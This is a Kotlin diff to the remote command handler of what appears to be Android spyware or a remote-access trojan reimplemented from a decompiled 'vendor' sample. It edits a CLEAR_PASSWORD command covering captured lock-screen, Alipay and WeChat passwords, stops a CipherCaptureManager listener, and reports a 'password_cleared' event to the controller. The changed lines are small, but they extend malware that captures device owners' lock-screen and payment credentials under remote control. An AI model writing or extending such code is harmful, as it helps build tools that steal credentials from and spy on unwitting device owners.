@@ -112,16 +112,23 @@ class DeviceStateCommandHandler : CommandHandler {
      * Clear a specific password type (lock, alipay, wechat).
      * Vendor: handles "CLEAR_PASSWORD" with passwordType param.
      */
+    /**
+     * Clear a specific password type (lock, alipay, wechat).
+     * Vendor: handles "CLEAR_PASSWORD" with passwordType param.
+     * - lock: stops CipherCaptureManager listening + resets isCipherCaptureEnabled
+     * - alipay/wechat: placeholder (payment password storage not yet implemented)
+     */
     private fun handleClearPassword(params: JSONObject?, context: CommandContext) {
         Log.d(TAG, "收到清除密码命令")
         try {
-            val passwordType = params?.optString("passwordType", "") ?: ""
+            val passwordType = params?.optString("passwordType", "lock") ?: "lock"
+            val service = context.service
 
             when (passwordType) {
                 "lock" -> {
-                    // vendor: clears via AppStatusManager.m210507a6("none", false, ""),
-                    // CipherCaptureManager.m211814b4(true/false), and service.m214865a1(null)
-                    Log.d(TAG, "锁屏密码已清空")
+                    service?.isCipherCaptureEnabled = false
+                    service?.cipherCaptureManager?.stopListeningFull()
+                    Log.d(TAG, "锁屏密码监听已停止，状态已重置")
                 }
                 "alipay" -> {
                     Log.d(TAG, "支付宝密码已清空")
@@ -134,14 +141,12 @@ class DeviceStateCommandHandler : CommandHandler {
                 }
             }
 
-            // Send confirmation
             val confirmation = JSONObject().apply {
                 put("passwordType", passwordType)
                 put("cleared", true)
             }
-            // vendor: event = StringUtil.m212470a0("O1gCKVo3HipoMidcEChIPA==") → "password_cleared"
             context.sendEvent("password_cleared", confirmation)
-            Log.d(TAG, "密码清除确认已发送")
+            Log.d(TAG, "密码清除确认已发送: $passwordType")
         } catch (e: Exception) {
             Log.e(TAG, "清除密码失败", e)
         }
